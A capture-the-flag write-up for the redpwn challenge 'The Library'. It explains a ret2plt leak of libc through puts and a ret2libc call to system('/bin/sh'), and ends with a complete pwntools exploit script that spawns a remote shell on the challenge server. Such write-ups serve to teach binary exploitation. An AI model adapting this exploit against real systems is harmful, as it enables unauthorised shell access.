# The Library
## Analysis
NX and ASLR are enabled, but there's no PIE so we can use a ret2plt to leak libc base and then execute a ret2libc attack to gain a shell.

## The Script
### Setup
```python
from pwn import *

elf = ELF('./the-library', checksec=False)
libc = ELF('./libc-remote.so', checksec=False)

p = remote('2020.redpwnc.tf', 31350)
```

### ret2plt
```python
# ret2plt to leak puts
payload = b'A' * 24
payload += POP_RDI
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

print(p.clean(0.2))

p.send(payload)
```

A **ret2plt** uses `puts@plt` to prints the value stored in the GOT entry of `puts`. We also set the return address to the location of `main` so we can have two inputs. Now we just need to parse he response to get us the location of `puts` in `libc`.

```python
p.recvline()
p.recvline()

puts = p.recv(6).ljust(8, b'\x00')              # Padding it to 8 bytes for u64()
puts = u64(puts)
log.success(f"puts: {hex(puts)}")

libc.address = puts - libc.symbols['puts']
log.success(f'Libc Base: {hex(libc.address)}')

p.clean(0.2)
```

### ret2libc
Now we just need to execute the final **ret2libc**, which uses the string `/bin/sh` in `libc` and passes this is a parameter to `system` in order to spawn a shell.

```python
# Final ret2libc
bin_sh = next(libc.search(b'/bin/sh\x00', writable=False))
system = libc.symbols['system']

payload = b'A' * 24
payload += POP_RDI
payload += p64(bin_sh)
payload += p64(system)
payload += p64(0x0)

p.sendline(payload)

p.interactive()
```

Unfortunately this doesn't work first try, due to stack alignment, so we just need to add in an extra `ret` instruction to align the payload.

## Final Exploit
```python
from pwn import *

elf = ELF('./the-library', checksec=False)
libc = ELF('./libc-remote.so', checksec=False)

p = remote('2020.redpwnc.tf', 31350)

POP_RDI = p64(0x400733) 
RET = p64(0x400506)


# ret2plt to leak puts
payload = b'A' * 24
payload += POP_RDI
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

print(p.clean(0.2))

p.send(payload)

p.recvline()
p.recvline()

puts = p.recv(6).ljust(8, b'\x00')              # Padding it to 8 bytes for u64()
puts = u64(puts)
log.success(f"puts: {hex(puts)}")

libc.address = puts - libc.symbols['puts']
log.success(f'Libc Base: {hex(libc.address)}')

p.clean(0.2)

# Final ret2libc
bin_sh = next(libc.search(b'/bin/sh\x00', writable=False))
system = libc.symbols['system']

payload = b'A' * 24
payload += RET          # Stack Alignment
payload += POP_RDI
payload += p64(bin_sh)
payload += p64(system)
payload += p64(0x0)

p.sendline(payload)

p.interactive()
```